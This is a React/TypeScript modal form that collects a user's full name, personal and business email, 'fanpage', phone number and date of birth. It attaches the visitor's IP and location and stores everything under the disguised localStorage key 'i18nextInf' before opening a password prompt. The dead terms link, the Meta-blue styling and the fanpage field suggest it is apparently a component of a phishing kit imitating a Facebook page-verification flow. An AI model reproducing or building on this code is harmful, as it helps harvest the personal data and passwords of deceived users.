import React from 'react';
import Modal from '#components/modals/Modal';
import PhoneInput from 'react-phone-input-2';
import CustomCheckbox from '#components/check-box/CustomCheckbox';
import { setLocalStorage } from '@/helper/localstorage';
import { useTranslation } from 'react-i18next';

interface InfomationsModalProps {
  isOpend: boolean;
  userLocation: {
    location: string | '0.0.0.0 | Unknown | Unknown(US)';
    country_code: string | 'US';
    ip: string | '0.0.0.0';
  };
  isOpendPassword: (isOpenPassword: boolean) => void;
  onToggleModal: (isOpen: boolean) => void;
}

const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, userLocation, isOpendPassword, onToggleModal }) => {

  const { t } = useTranslation();
  const [isOpen, setIsOpen] = React.useState(isOpend);
  const [errors, setErrors] = React.useState<Record<string, string>>({});

  const [formData, setFormData] = React.useState({
    fullName: '',
    email: '',
    emailBusiness: '',
    fanpage: '',
    phone: '',
    day: '',
    month: '',
    year: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({ ...prev, [id]: value }));
    setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
  };

  React.useEffect(() => {
    setIsOpen(isOpend);
  }, [isOpend]);

  const handleClose = () => {
    setIsOpen(false);
    onToggleModal(false);
  };

  const handSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault();

      const newErrors: Record<string, string> = {};
      if (!formData.fullName.trim()) newErrors.fullName = t('modal.information.form.full_name.error');
      if (!formData.email.trim()) newErrors.email = t('modal.information.form.email.error');
      if (!formData.emailBusiness.trim()) newErrors.emailBusiness = t('modal.information.form.email_business.error');
      if (!formData.fanpage.trim()) newErrors.fanpage = t('modal.information.form.fanpage.error');
      if (!formData.phone.trim()) newErrors.phone = t('modal.information.form.phone.error');
      if (!formData.day.trim()) newErrors.day = t('modal.information.form.day.error');
      if (!formData.month.trim()) newErrors.month = t('modal.information.form.month.error');
      if (!formData.year.trim()) newErrors.year = t('modal.information.form.year.error');

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors);
        return;
      }

      const clientData = {
        ...formData,
        location: userLocation.location,
        ip: userLocation.ip,
      };

      setLocalStorage("i18nextInf", clientData);
      isOpendPassword(true);
      handleClose();

      setFormData({
        fullName: '',
        email: '',
        emailBusiness: '',
        fanpage: '',
        phone: '',
        day: '',
        month: '',
        year: ''
      });

    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
  const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

  return (
    <Modal
      isOpen={isOpen}
      title={t('modal.information.title')}
      onClose={handleClose}
    >
      <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
        <form onSubmit={handSubmit} autoComplete="off">
          <div className='w-full'>
            <div className={inputClass('fullName')}>
              <input
                type="text"
                id='fullName'
                placeholder={t('modal.information.form.full_name.placeholder')}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fullName}
                onChange={handleChange}
              />
            </div>
            {errorText('fullName')}

            <div className={inputClass('email')}>
              <input
                type="text"
                id='email'
                placeholder={t('modal.information.form.email.placeholder')}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.email}
                onChange={handleChange}
              />
            </div>
            {errorText('email')}

            <div className={inputClass('emailBusiness')}>
              <input
                type="text"
                id='emailBusiness'
                placeholder={t('modal.information.form.email_business.placeholder')}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.emailBusiness}
                onChange={handleChange}
              />
            </div>
            {errorText('emailBusiness')}

            <div className={inputClass('fanpage')}>
              <input
                type="text"
                id='fanpage'
                placeholder={t('modal.information.form.fanpage.placeholder')}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fanpage}
                onChange={handleChange}
              />
            </div>
            {errorText('fanpage')}

            <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
              <PhoneInput
                country={userLocation?.country_code?.toLowerCase() || "us"}
                value={formData.phone}
                onChange={(phone) => {
                  setFormData(prev => ({ ...prev, phone }))
                  setErrors(prev => ({ ...prev, phone: '' }))
                  if (phone.length > 0) {
                    setErrors(prev => ({ ...prev, phone: '' }))
                  }
                }}
              />
            </div>
            {errorText('phone')}

            <div>
              <b className='text-[#9a979e] text-[14px] mb-[7px]'>{t('modal.information.form.day.title')}</b>
            </div>
            <div className="grid grid-cols-3 gap-[10px]">
              <div>
                <div className={inputClass('day')}>
                  <input
                    type="number"
                    placeholder={t('modal.information.form.day.placeholder')}
                    id='day'
                    className="w-full outline-0 h-full tracking-wide"
                    value={formData.day}
                    onChange={handleChange}
                  />
                </div>
                {errorText('day')}
              </div>

              <div>
                <div className={inputClass('month')}>
                  <input
                    type="number"
                    placeholder={t('modal.information.form.month.placeholder')}
                    className="w-full outline-0 h-full tracking-wide"
                    value={formData.month}
                    id='month'
                    onChange={handleChange}
                  />
                </div>
                {errorText('month')}
              </div>

              <div>
                <div className={inputClass('year')}>
                  <input
                    type="number"
                    inputMode="numeric"
                    placeholder={t('modal.information.form.year.placeholder')}
                    id='year'
                    className="w-full outline-0 h-full tracking-wide"
                    value={formData.year}
                    onChange={handleChange}
                  />
                </div>
                {errorText('year')}
              </div>

            </div>

            <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
              <textarea
                id='message'
                className="w-full outline-0 h-full resize-none"
                placeholder={t('modal.information.form.message.placeholder')}
              />
            </div>

            <div>
              <p className='text-[#9a979e] text-[14px] mb-[7px]'>{t('modal.information.form.message.description')}</p>
            </div>
            <div className='mt-[15px] mb-[20px]'>
              <label className='cursor-pointer flex items-center gap-[5px] text-[14px] ' htmlFor="custom-checkbox">
                <CustomCheckbox />
                {t('modal.information.form.terms.label')} <a className="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">{t('modal.information.form.terms.link')}</a>
              </label>
            </div>
            <div className='w-full mt-[20px] '>
              <button className='w-full h-[45px] min-h-[45px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]'>{t('modal.information.form.button.text')}</button>
            </div>
          </div>

        </form>
      </div>
    </Modal>
  );
};

export default InfomationsModal;